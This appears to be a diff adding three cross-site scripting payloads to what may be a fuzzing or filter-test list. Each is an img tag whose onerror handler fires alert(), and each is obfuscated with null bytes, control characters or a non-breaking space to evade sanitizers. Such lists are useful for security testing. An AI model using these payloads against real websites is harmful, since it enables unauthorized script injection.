@@ -1,0 +1,3 @@
+<img%00/ src=x onerror=alert(1)//>
+<img src=%17%17 onerror=alert(2)//>
+<img/\%20src=%17y%17' 'onerror=%C2%A0alert(3)//>
